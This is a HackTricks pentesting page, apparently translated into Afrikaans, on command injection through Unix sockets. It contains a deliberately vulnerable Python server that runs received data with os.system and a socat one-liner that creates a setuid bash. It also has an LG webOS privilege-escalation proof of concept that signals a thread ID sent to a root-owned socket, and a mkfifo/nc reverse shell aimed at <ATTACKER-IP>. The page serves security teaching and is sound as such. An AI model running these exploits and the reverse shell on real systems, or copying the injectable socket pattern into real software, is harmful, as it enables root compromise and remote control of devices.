# Socket Command Injection

{{#include ../../banners/hacktricks-training.md}}

## Socket binding example with Python

In die volgende voorbeeld word 'n **unix socket geskep** (`/tmp/socket_test.s`) en alles wat **ontvang** word, gaan deur `os.system` **uitgevoer** word. Ek weet dat jy dit nie in die natuur gaan vind nie, maar die doel van hierdie voorbeeld is om te sien hoe code wat unix sockets gebruik lyk, en hoe om die input in die slegste moontlike geval te hanteer.
```python:s.py
import socket
import os, os.path
import time
from collections import deque

if os.path.exists("/tmp/socket_test.s"):
os.remove("/tmp/socket_test.s")

server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
server.bind("/tmp/socket_test.s")
os.system("chmod o+w /tmp/socket_test.s")
while True:
server.listen(1)
conn, addr = server.accept()
datagram = conn.recv(1024)
if datagram:
print(datagram)
os.system(datagram)
conn.close()
```
**Voer** die kode uit met python: `python s.py` en **kontroleer hoe die socket luister**:
```python
netstat -a -p --unix | grep "socket_test"
(Not all processes could be identified, non-owned process info
will not be shown, you would have to be root to see it all.)
unix  2      [ ACC ]     STREAM     LISTENING     901181   132748/python        /tmp/socket_test.s
```
**Exploit**
```python
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/socket_test.s
```
## Gevalstudie: Root-owned UNIX socket sein-geaktiveerde eskalasie (LG webOS)

Sommige bevoorregte daemons maak 'n root-owned UNIX socket beskikbaar wat onbetroubare insette aanvaar en bevoorregte aksies koppel aan thread-IDs en seine. As die protokol 'n onbevoorregde kliënt toelaat om te beïnvloed watter native thread geteiken word, kan jy moontlik 'n bevoorregte kodepad triggreer en eskaleer.

Waargenome patroon:
- Connect to a root-owned socket (e.g., /tmp/remotelogger).
- Create a thread and obtain its native thread id (TID).
- Send the TID (packed) plus padding as a request; receive an acknowledgement.
- Deliver a specific signal to that TID to trigger the privileged behaviour.

Minimale PoC-skets:
```python
import socket, struct, os, threading, time
# Spawn a thread so we have a TID we can signal
th = threading.Thread(target=time.sleep, args=(600,)); th.start()
tid = th.native_id  # Python >=3.8
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/tmp/remotelogger")
s.sendall(struct.pack('<L', tid) + b'A'*0x80)
s.recv(4)  # sync
os.kill(tid, 4)  # deliver SIGILL (example from the case)
```
Om dit in 'n root shell te omskep, kan 'n eenvoudige named-pipe + nc-patroon gebruik word:
```bash
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER-IP> 23231 > /tmp/f
```
Aantekeninge:
- Hierdie klas foute ontstaan deur waardes, afgelei van nie-geprivilegieerde kliënttoestand (TIDs), te vertrou en dit te bind aan geprivilegieerde signal handlers of logika.
- Verhard deur credentials op die socket af te dwing, message formats te valideer, en privileged operations te ontkoppel van externally supplied thread identifiers.

## Verwysings

- [LG WebOS TV Path Traversal, Authentication Bypass and Full Device Takeover (SSD Disclosure)](https://ssd-disclosure.com/lg-webos-tv-path-traversal-authentication-bypass-and-full-device-takeover/)

{{#include ../../banners/hacktricks-training.md}}
